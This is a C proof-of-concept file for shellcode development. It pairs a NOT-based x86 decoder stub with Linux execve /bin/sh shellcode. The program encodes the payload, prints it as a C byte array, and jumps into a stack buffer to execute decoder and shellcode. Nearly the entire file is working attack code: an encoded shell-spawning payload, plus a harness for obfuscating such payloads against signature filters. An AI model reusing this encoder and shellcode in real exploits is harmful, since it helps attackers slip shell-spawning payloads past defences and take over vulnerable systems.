/*
 * Proof-of-concept to test the decoder
 *
 * Rodrigo Rubira Branco <rodrigo@kernelhacking.com>
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void print_code(char *data);

char decoder[]=            /*  20 bytes                          */
  "\xeb\x0b" //                   jmp    d <label3>
  "\x5e" //                      popl   %esi
  "\x6a\x00" //                   pushl  $0x0
  "\x59" //                      popl   %ecx
  "\xf6\x16" //                   notb   (%esi)
  "\x46" //                      incl   %esi
  "\xe2\xfb" //                   loopl  6 <label2>
  "\xeb\x05" //                   jmp    12 <label4>
  "\xe8\xf0\xff\xff\xff"; //          calll  2 <label1>

/* Linux execve /bin/sh shellcode */
char shellcode[]=           /*  24 bytes                          */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\x99"                  /*  cltd                              */
    "\xb0\x0b"              /*  movb    $0x0b,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;


main(int argc,char **argv) {
    char buffer[16384],*p;
    int i,l;

    decoder[4]=(unsigned char)strlen(shellcode);

    for(i=0;i<strlen(shellcode);i++) {
        __asm__(
            "movl    %0,%%esi\n"
            "addl    %1,%%esi\n"
            "notb    (%%esi)\n"
            :
            : "g" (shellcode), "g" (i)
            : "si", "memory"
        );
    }


    p=buffer;    

    for(i=0;i<strlen(decoder);i++) *p++=decoder[i];
    for(i=0;i<strlen(shellcode);i++) *p++=shellcode[i];

    p=0;

	// imprimir decoder
	// print_code(decoderl);
	// Imprimir shellcode
	print_code(shellcode);

    (*(void (*)())buffer)();
}



void print_code(char *data) {

  int i,l = 15;

  printf("\n\nchar code[] =\n");

  for (i = 0; i < strlen(data); ++i) {
    if (l >= 15) {
      if (i)
        printf("\"\n");
      printf("\t\"");
      l = 0;
    }
    ++l;
    printf("\\x%02x", ((unsigned char *)data)[i]);
  }
  printf("\";\n\n\n");
}
